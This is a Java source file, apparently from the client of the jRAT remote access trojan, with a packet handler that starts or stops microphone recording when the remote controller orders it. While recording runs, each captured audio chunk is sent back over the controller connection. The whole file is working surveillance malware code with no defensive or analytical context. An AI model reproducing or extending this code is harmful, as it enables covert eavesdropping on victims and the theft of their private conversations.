package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.client.packets.outgoing.Packet58ClientUploadSoundCapture;
import jrat.common.SoundWriter;

public class Packet84ToggleSoundCapture implements IncomingPacket {

	@Override
	public void read(final Connection con) throws Exception {
		boolean start = con.readBoolean();
		int quality = con.readInt();
		
		if (start) {
			new Thread(new SoundWriter(quality) {
				@Override
				public void onRead(byte[] data, int read) throws Exception {
					con.addToSendQueue(new Packet58ClientUploadSoundCapture(data, read, quality));	
				}
			}).start();
		} else {
			SoundWriter.instance.stop();
		}
	}

}
